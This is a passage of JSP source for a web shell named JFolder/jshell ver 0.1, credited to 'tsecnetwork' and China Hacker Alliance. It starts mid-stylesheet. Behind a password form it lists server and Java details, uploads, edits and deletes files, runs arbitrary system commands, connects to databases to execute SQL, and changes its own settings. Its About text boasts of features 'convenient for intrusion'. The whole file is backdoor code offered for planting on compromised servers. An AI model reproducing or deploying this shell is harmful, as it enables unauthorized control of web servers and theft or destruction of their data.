border: black solid 1;
}
.inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}
.table1 {BORDER:gray 0px ridge;}
.td2 {BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey; height:18px;}
.tr1 {BACKGROUND-color:gray }
</style>
<script language="JavaScript">
<!--
function ltrim(str) {
    while (str.indexOf(0) == " ")
        str = str.substring(1);
        
    return str;
}

function changeAction(obj) {
    obj.submit();
}
//-->
</script>
<body>
<%
session.setMaxInactiveInterval(_sessionOutTime * 60);

if (request.getParameter("password") == null && session.getAttribute("password") == null) {
// show the login form
//================================================================================================
%>
<div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:14px;top:200px">
  <TABLE class="table1" cellSpacing="1" cellPadding="1" width="473" border="0" align="center">
    <tr>
      <td class="tr1">
        <TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
          <tr>
            <TD align="left"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>Admin Login :::...</b></font></TD>
            <TD align="right"><FONT color="#d2d8ec"><b>JFolder</b>_By_<b>tsecnetwork</b></FONT></TD>
          </tr>
            <form name="f1" method="post">
            <input type="hidden" name="__EVENTTARGET" value="" />
            <input type="hidden" name="__EVENTARGUMENT" value="" />
            <input type="hidden" name="__VIEWSTATE" value="dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpcGFydC9mb3JtLWRhdGE7Pj47bDxpPDE5Pjs+O2w8dDxAMDw7Ozs7Ozs7Ozs7Pjs7Pjs+Pjs+PjtsPE5ld0ZpbGU7TmV3RmlsZTtOZXdEaXJlY3Rvcnk7TmV3RGlyZWN0b3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==" />
            <script language="javascript" type="text/javascript">
<!--
    function __doPostBack(eventTarget, eventArgument) {
        var theform;
        if (window.navigator.appName.toLowerCase().indexOf("microsoft") > -1) {
            theform = document.Form1;
        }
        else {
            theform = document.forms["Form1"];
        }
        theform.__EVENTTARGET.value = eventTarget.split("$").join(":");
        theform.__EVENTARGUMENT.value = eventArgument;
        theform.submit();
    }
// -->
</script>
            <tr>
              <td height="30" align="center" class="td2" colspan="2">
                <input name="password" type="password" class="textbox" id="Textbox" />
                <input type="submit" name="Button" value="Login" id="Button" title="Click here to login" class="button" />
              </td>
            </tr>
          </form>
          <SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>
      </TABLE></td>
    </tr>
  </TABLE>
</div>
<%
//================================================================================================
// end of the login form
} else {
    String password = null;
    
    if (session.getAttribute("password") == null) {
        password = (String)request.getParameter("password");
        
        if (validate(password) == false) {
            out.println("<div align=\"center\"><font color=\"red\"><li>Oops, bad luck!</font></div>");
            out.close();
            return;
        }
        
        session.setAttribute("password", password);
    } else {
        password = (String)session.getAttribute("password");
    }
    
    String action = null;
    

    if (request.getParameter("action") == null)
        action = "main";
    else 
        action = (String)request.getParameter("action");
        
    if (action.equals("exit")) {
        session.removeAttribute("password");
        response.sendRedirect(request.getRequestURI());
        out.close();
        return;
    }

// show the main menu
//====================================================================================
%>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="0">
    <form name="form1" method="get">
    <tr bgcolor="#CCCCCC">
        <td id="title"><!--[Program Home]--></td>
        <td align="right">
            <select name="action" onChange="javascript:changeAction(document.form1)">
                <option value="main">Program Home</option>
                <option value="filesystem">File System</option>
                <option value="command">System Commands</option>
                <option value="database">Database</option>
                <option value="config">Program Configuration</option>
                <option value="about">About</option>
                <option value="exit">Exit</option>
            </select>
<script language="JavaScript">
<%
    out.println("var action = \"" + action + "\"");
%>
var sAction = document.form1.action;
for (var i = 0; i < sAction.length; i ++) {
    if (sAction[i].value == action) {
        sAction[i].selected = true;
        //title.innerHTML = "[" + sAction[i].innerHTML + "]";
    }
}
</script>
        </td>
    </tr>
    </form>
</table>
<%
//=====================================================================================
// end of main menu

    if (action.equals("main")) {
// print the system info table
//=======================================================================================
%>
<table align="center" width="600" cellpadding="2" cellspacing="1" border="0" bgcolor="#CCCCCC">
    <tr bgcolor="#FFFFFF">
        <td colspan="2" align="center">Server Information</td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Server Name</td>
        <td align="center" class="datarows"><%=request.getServerName()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Server Port</td>
        <td align="center" class="datarows"><%=request.getServerPort()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Operating System</td>
        <td align="center" class="datarows"><%=System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Current Username</td>
        <td align="center" class="datarows"><%=System.getProperty("user.name")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Current User Directory</td>
        <td align="center" class="datarows"><%=System.getProperty("user.home")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Current Working Directory</td>
        <td align="center" class="datarows"><%=System.getProperty("user.dir")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Program Relative Path</td>
        <td align="center" class="datarows"><%=request.getRequestURI()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Program Absolute Path</td>
        <td align="center" class="datarows"><%=request.getRealPath(request.getServletPath())%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Network Protocol</td>
        <td align="center" class="datarows"><%=request.getProtocol()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Server Software Version</td>
        <td align="center" class="datarows"><%=application.getServerInfo()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">JDK Version</td>
        <td align="center" class="datarows"><%=System.getProperty("java.version")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">JDK Installation Path</td>
        <td align="center" class="datarows"><%=System.getProperty("java.home")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">JVM Version</td>
        <td align="center" class="datarows"><%=System.getProperty("java.vm.specification.version")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">JVM Name</td>
        <td align="center" class="datarows"><%=System.getProperty("java.vm.name")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Java Class Path</td>
        <td align="center" class="datarows"><%=System.getProperty("java.class.path")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Java Library Search Path</td>
        <td align="center" class="datarows"><%=System.getProperty("java.library.path")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Java Temp Directory</td>
        <td align="center" class="datarows"><%=System.getProperty("java.io.tmpdir")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">JIT Compiler Name</td>
        <td align="center" class="datarows"><%=System.getProperty("java.compiler") == null ? "" : System.getProperty("java.compiler")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Extension Directory Path</td>
        <td align="center" class="datarows"><%=System.getProperty("java.ext.dirs")%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td colspan="2" align="center">Client Information</td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Client Address</td>
        <td align="center" class="datarows"><%=request.getRemoteAddr()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Client Host</td>
        <td align="center" class="datarows"><%=request.getRemoteHost()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Username</td>
        <td align="center" class="datarows"><%=request.getRemoteUser() == null ? "" : request.getRemoteUser()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Request Method</td>
        <td align="center" class="datarows"><%=request.getScheme()%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center" class="datarows">Secure Socket Layer</td>
        <td align="center" class="datarows"><%=request.isSecure() == true ? "Yes" : "No"%></td>
    </tr>
</table>
<%
//=======================================================================================
// end of printing the system info table
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else if (action.equals("filesystem")) {
        String curPath = "";
        String result = "";
        String fsAction = "";
        
        if (request.getParameter("curPath") == null) {
            curPath = request.getRealPath(request.getServletPath());
            curPath = pathConvert((new File(curPath)).getParent());
        } else {
            curPath = Unicode2GB((String)request.getParameter("curPath"));
        }
        
        if (request.getParameter("fsAction") == null) {
            fsAction = "list";
        } else {
            fsAction = (String)request.getParameter("fsAction");
        }
        
        if (fsAction.equals("list"))
            result = listFiles(curPath, request.getRequestURI() + "?action=" + action);
        else if (fsAction.equals("browse")) {
            result = listFiles(new File(curPath).getParent(), request.getRequestURI() + "?action=" + action);
            result += browseFile(curPath);
        }
        else if (fsAction.equals("open"))
            result = openFile(curPath, request.getRequestURI() + "?action=" + action);
        else if (fsAction.equals("save")) {
            if (request.getParameter("fileContent") == null) {
                result = "<font color=\"red\">Page navigation error</font>";
            } else {
                String fileContent = Unicode2GB((String)request.getParameter("fileContent"));
                result = saveFile(curPath, request.getRequestURI() + "?action=" + action, fileContent);
            }
        } else if (fsAction.equals("createFolder")) {
            if (request.getParameter("folderName") == null) {
                result = "<font color=\"red\">Folder name cannot be empty</font>";
            } else {
                String folderName = Unicode2GB(request.getParameter("folderName").trim());
                if (folderName.equals("")) {
                    result = "<font color=\"red\">Folder name cannot be empty</font>"; 
                } else {
                    result = createFolder(curPath, request.getRequestURI() + "?action=" + action, folderName);
                }
            }
        } else if (fsAction.equals("createFile")) {
            if (request.getParameter("fileName") == null) {
                result = "<font color=\"red\">File name cannot be empty</font>";
            } else {
                String fileName = Unicode2GB(request.getParameter("fileName").trim());
                if (fileName.equals("")) {
                    result = "<font color=\"red\">File name cannot be empty</font>";
                } else {
                    result = createFile(curPath, request.getRequestURI() + "?action=" + action, fileName);
                }
            }
        } else if (fsAction.equals("deleteFile")) {
            if (request.getParameter("filesDelete") == null) {
                result = "<font color=\"red\">No files selected to delete</font>";
            } else {
                String[] files2Delete = (String[])request.getParameterValues("filesDelete");
                if (files2Delete.length == 0) {
                    result = "<font color=\"red\">No files selected to delete</font>";
                } else {
                    for (int n = 0; n < files2Delete.length; n ++) {
                        files2Delete[n] = Unicode2GB(files2Delete[n]);
                    }
                    result = deleteFile(curPath, request.getRequestURI() + "?action=" + action, files2Delete);
                }
            }
        } else if (fsAction.equals("saveAs")) {
            if (request.getParameter("fileContent") == null) {
                result = "<font color=\"red\">Page navigation error</font>";
            } else {
                String fileContent = Unicode2GB(request.getParameter("fileContent"));
                result = saveAs(curPath, request.getRequestURI() + "?action=" + action, fileContent);
            }
        } else if (fsAction.equals("upload")) {
            result = uploadFile(request, curPath, request.getRequestURI() + "?action=" + action);
        } else if (fsAction.equals("copyto")) {
            if (request.getParameter("filesDelete") == null || request.getParameter("dstPath") == null) {
                result = "<font color=\"red\">No files selected to copy</font>";
            } else {
                String[] files2Copy = request.getParameterValues("filesDelete");
                String dstPath = request.getParameter("dstPath").trim();
                if (files2Copy.length == 0) {
                    result = "<font color=\"red\">No files selected to copy</font>";
                } else if (dstPath.equals("")) {
                    result = "<font color=\"red\">No destination directory path specified</font>";
                } else {
                    for (int i = 0; i < files2Copy.length; i ++)
                        files2Copy[i] = Unicode2GB(files2Copy[i]);
                    
                    result = copyFiles(curPath, request.getRequestURI() + "?action=" + action, files2Copy, Unicode2GB(dstPath));
                }
            }
        } else if (fsAction.equals("rename")) {
            if (request.getParameter("fileRename") == null) {
                result = "<font color=\"red\">Page navigation error</font>";
            } else {
                String file2Rename = request.getParameter("fileRename").trim();
                String newName = request.getParameter("newName").trim();
                if (file2Rename.equals("")) {
                    result = "<font color=\"red\">No file selected to rename</font>";
                } else if (newName.equals("")) {
                    result = "<font color=\"red\">No new file name specified</font>";
                } else {
                    result = renameFile(curPath, request.getRequestURI() + "?action=" + action, Unicode2GB(file2Rename), Unicode2GB(newName));
                }            
            }
        }
%>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    <form method="post" name="form2" action="<%= request.getRequestURI() + "?action=" + action%>">
    <tr bgcolor="#FFFFFF">
        <td align="center">Path&nbsp;&nbsp;<input type="text" size="80" name="curPath" class="textbox" value="<%=curPath%>" />
                                             <input type="submit" value="Go" class="button" /></td>
    </tr>
    </form>
    <tr bgcolor="#FFFFFF">
        <td><%= result.trim().equals("")?"&nbsp;" : result%></td>
    </tr>
</table>
<%        
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else if (action.equals("command")) {
        String cmd = "";
        InputStream ins = null;
        String result = "";
        
        if (request.getParameter("command") != null) {        
            cmd = (String)request.getParameter("command");
            result = exeCmd(cmd);
        }
// print the command form
//========================================================================================
%>
<table border="0" width="600" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC" align="center">
    <form name="form2" method="post" action="<%=request.getRequestURI() + "?action=" + action%>">
    <tr bgcolor="#FFFFFF">
        <td align="center">Execute Command</td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">
            <input type="text" class="textbox" size="80" name="command" value="<%=cmd%>" />
            <input type="submit" class="button" value="Execute" />
        </td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Execution Result</td>
    </tr>
    </form>
</table>
<table align="center" width="600" border="0">
    <tr>
        <td><%=result == "" ? "&nbsp;" : result%></td>
    </tr>
</table>
<%
//=========================================================================================
// end of printing command form
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else if (action.equals("database")) {
        String dbAction = "";
        String result = "";
        String dbType = "";
        String dbServer = "";
        String dbPort = "";
        String dbUsername = "";
        String dbPassword = "";
        String dbName = "";
        String dbResult = "";
        String sql = "";
        
        if (request.getParameter("dbAction") == null) {
            dbAction = "main";
        } else {
            dbAction = request.getParameter("dbAction").trim();
            if (dbAction.equals(""))
                dbAction = "main";
        }
        
        if (dbAction.equals("main")) {
            result = "&nbsp;";
        } else if (dbAction.equals("dbConnect")) {
            if (request.getParameter("dbType") == null ||
                request.getParameter("dbServer") == null ||
                request.getParameter("dbPort") == null ||
                request.getParameter("dbUsername") == null ||
                request.getParameter("dbPassword") == null ||
                request.getParameter("dbName") == null) {
                response.sendRedirect(request.getRequestURI() + "?action=" + action);
            } else {
                dbType = request.getParameter("dbType").trim();
                dbServer = request.getParameter("dbServer").trim();
                dbPort = request.getParameter("dbPort").trim();
                dbUsername = request.getParameter("dbUsername").trim();
                dbPassword = request.getParameter("dbPassword").trim();
                dbName = request.getParameter("dbName").trim();
                
                if (DBInit(dbType, dbServer, dbPort, dbUsername, dbPassword, dbName)) {
                    if (DBConnect(dbUsername, dbPassword)) {
                        if (request.getParameter("sql") != null) {
                            sql = request.getParameter("sql").trim();
                            if (! sql.equals("")) {
                                dbResult = DBExecute(sql);
                            }
                        }
                        
                        result =  "<script language=\"javascript\">\n";
                        result += "<!--\n";
                        result += "function exeSql() {\n";
                        result += "    if (ltrim(document.dbInfo.sql.value) != \"\")\n";
                        result += "        document.dbInfo.submit();";
                        result += "}\n";
                        result += "\n";
                        result += "function resetIt() {\n";
                        result += "    document.dbInfo.sql.value = \"\";";
                        result += "}\n";
                        result += "//-->\n";
                        result += "</script>\n";
                        result += "SQL Statement<br/><textarea name=\"sql\" cols=\"70\" rows=\"6\">" + sql + "</textarea><br/><input type=\"submit\" class=\"button\" onclick=\"javascript:exeSql()\" value=\"Execute\"/>&nbsp;<input type=\"reset\" class=\"button\" onclick=\"javascript:resetIt()\" value=\"Clear\"/>\n";
                        
                        DBRelease();
                    } else {
                        result = "<font color=\"red\">Database connection failed</font>";
                    }
                } else {
                    result = "<font color=\"red\">Database driver not found</font>";
                }                
            }
        }
%>
<script language="javascript">
<!--
<%
out.println("var selectedType = \"" + dbType + "\";");
%>
//-->
</script>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    <form name="dbInfo" method="post" action="<%=request.getRequestURI() + "?action=" + action + "&dbAction=dbConnect"%>">
    <tr bgcolor="#FFFFFF">
        <td width="300" align="center">Database Type</td>
        <td align="center">
            <select name="dbType">
                <option value="sqlserver">SQLServer Database</option>
                <option value="mysql">MySql Database</option>
                <option value="oracle">Oracle Database</option>
                <option value="db2">DB2 Database</option>
                <option value="odbc">ODBC Data Source</option>
            </select>
            <script language="javascript">
            for (var i = 0; i < document.dbInfo.dbType.options.length; i ++) {
                if (document.dbInfo.dbType.options[i].value == selectedType) {
                    document.dbInfo.dbType.options[i].selected = true;
                }
            }
            </script>
        </td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Database Server</td>
        <td align="center"><input type="text" name="dbServer" class="textbox" value="<%=dbServer%>" style="width:150px;" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Database Port</td>
        <td align="center"><input type="text" name="dbPort" class="textbox" value="<%=dbPort%>" style="width:150px;" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Database Username</td>
        <td align="center"><input type="text" name="dbUsername" class="textbox" value="<%=dbUsername%>" size="20" style="width:150px;" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Database Password</td>
        <td align="center"><input type="password" name="dbPassword" class="textbox" value="<%=dbPassword%>" size="20" style="width:150px;" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Database Name</td>
        <td align="center"><input type="text" name="dbName" class="textbox" value="<%=dbName%>" size="20" style="width:150px;" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center" colspan="2"><input type="submit" value="Connect" class="button" />&nbsp;<input type="reset" value="Reset" class="button" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center" colspan="2"><%=result%></td>
    </tr>
    </form>
</table>
<table align="center" width="100%" border="0">
    <tr>
        <td align="center">
            <%=dbResult%>
        </td>
    </tr>
</table>
<%        

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////        
    } else if (action.equals("config")) {
        String cfAction = "";
        int i;
        
        if (request.getParameter("cfAction") == null) {

            cfAction = "main";
        } else {
            cfAction = request.getParameter("cfAction").trim();
            if (cfAction.equals(""))
                cfAction = "main";
        }
        
        if (cfAction.equals("main")) {
// start of config form
//==========================================================================================
%>
<script language="javascript">
<!--
function delFileType() {
    document.config.newType.value = document.config.textFileTypes[document.config.textFileTypes.selectedIndex].value;
    document.config.textFileTypes.options.remove(document.config.textFileTypes.selectedIndex);
}

function addFileType() {
    if (document.config.newType.value != "") {
        var oOption = document.createElement("OPTION");
        document.config.textFileTypes.options.add(oOption);
        oOption.value = document.config.newType.value;
        oOption.innerHTML = document.config.newType.value;
    }
}

function selectAllTypes() {
    for (var i = 0; i < document.config.textFileTypes.options.length; i ++) {
        document.config.textFileTypes.options[i].selected = true;
    }
}
//-->
</script>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    <form name="config" method="post" action="<%=request.getRequestURI() + "?action=config&cfAction=save"%>" onSubmit="javascript:selectAllTypes()">
    <tr bgcolor="#FFFFFF">
        <td align="center" width="200">Password</td>
        <td><input type="text" size="30" name="password" class="textbox" value="<%=_password%>" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">System Encoding</td>
        <td><input type="text" size="30" name="encode" value="<%=_encodeType%>" class="textbox" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Session Timeout</td>
        <td><input type="text" size="5" name="sessionTime" class="textbox" value="<%=_sessionOutTime%>" /></td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center">Editable File Types</td>
        <td>
            <table border="0" width="190" cellpadding="0" cellspacing="0">
                <tr>
                    <td>
                        <input type="text" size="11" class="textbox" name="newType" />
                    </td>
                    <td align="center">
                        <input type="button" onClick="javascript:delFileType()" value="<<" class="button" />
                        <p></p>
                        <input type="button" value=">>" onClick="javascript:addFileType()" class="button" />
                    </td>
                    <td align="right">    
                        <select name="textFileTypes" size="4" style="width: 87px" multiple="true">  
<%
        for (i = 0; i < _textFileTypes.length; i ++) {
%>
                            <option value="<%=_textFileTypes[i]%>"><%=_textFileTypes[i]%></option>
<%
         }
%>
                        </select>
                    </td>
                </tr>
            </table>
        </td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="center" colspan="2"><input type="submit" value="Save" class="button" /></td>
    </tr>
    </form>
</table>
<%
        } else if (cfAction.equals("save")) {
            if (request.getParameter("password") == null || 
                request.getParameter("encode") == null || 
                request.getParameter("sessionTime") == null ||
                request.getParameterValues("textFileTypes") == null) {
                response.sendRedirect(request.getRequestURI());
            }
            
            String result = "";
            
            String newPassword = request.getParameter("password").trim();
            String newEncodeType = request.getParameter("encode").trim();
            String newSessionTime = request.getParameter("sessionTime").trim();
            String[] newTextFileTypes = request.getParameterValues("textFileTypes");
            String jshellPath = request.getRealPath(request.getServletPath());
            
            try {
                JshellConfig jconfig = new JshellConfig(jshellPath);
                jconfig.setPassword(newPassword);
                jconfig.setEncodeType(newEncodeType);
                jconfig.setSessionTime(newSessionTime);
                jconfig.setTextFileTypes(newTextFileTypes);
                jconfig.save();
                result += "Settings saved successfully, returning now, please wait...";
                result += "<meta http-equiv=\"refresh\" content=\"2;url=" + request.getRequestURI() + "?action=" + request.getParameter("action") + "\">";
            } catch (JshellConfigException e) {
                result = "<font color=\"red\">" + e.getMessage() + "</font>"; 
            }

%>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    <tr bgcolor="#FFFFFF">
        <td><%=result == "" ? "&nbsp;" : result%></td>
    </tr>
</table>
<%
        }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//==========================================================================================
// end of config form
    } else if (action.equals("about")) {
// start of about
//==========================================================================================
%>
<table border="0" align="center" width="600" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    <tr bgcolor="#FFFFFF">
        <td align="center">About jshell ver 0.1</td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td>&nbsp;&nbsp;&nbsp;&nbsp;Added functionality to display Alexa ranking, which is more convenient for intrusion. Copyright still belongs to the author.</td>
    </tr>
    <tr bgcolor="#FFFFFF">
        <td align="right">tsecnetwork by <a href="mailto:severityhunting@protonmail.com">tsecnetwork</a> and welcome to <a href="http://www.77169.com" target="_blank">China Hacker Alliance</a></td>
    </tr>
</table>
<%    
//==========================================================================================
    }
}
%>
</body>
</html>
